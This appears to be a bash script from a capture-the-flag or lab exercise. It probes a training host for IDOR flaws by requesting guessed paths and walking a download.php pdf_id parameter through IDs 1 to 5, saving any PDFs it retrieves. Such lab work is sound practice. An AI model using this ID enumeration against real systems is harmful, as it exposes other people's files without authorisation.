#!/bin/bash

echo "[*] Testing IDOR endpoints..."

# Test basic IDOR paths
for path in idor IDOR idor/ IDOR/ idor/index.php idor/download.php; do
    echo "Testing: http://hackme1.vulnmachines.com/$path"
    curl -s -o /tmp/test_$path.html "http://hackme1.vulnmachines.com/$path"
    SIZE=$(wc -c < /tmp/test_$path.html)
    echo "  Size: $SIZE bytes"
    
    # Check if it's not the default Apache page (10918 bytes)
    if [ "$SIZE" -ne "10918" ] && [ "$SIZE" -ne "286" ]; then
        echo "  [!] Non-default content found!"
        head -n 5 /tmp/test_$path.html
    fi
done

# Test download.php with pdf_id parameter
echo -e "\n[*] Testing download.php with pdf_id..."
for id in 1 2 3 4 5; do
    echo "Testing: download.php?pdf_id=$id"
    curl -s -o /tmp/pdf_$id "http://hackme1.vulnmachines.com/download.php?pdf_id=$id"
    
    # Check if it's a PDF
    if head -c 4 /tmp/pdf_$id | grep -q "%PDF"; then
        echo "  [!!!] PDF FOUND with pdf_id=$id"
        cp /tmp/pdf_$id /workspace/found_pdf_$id.pdf
        echo "  Saved to /workspace/found_pdf_$id.pdf"
    fi
done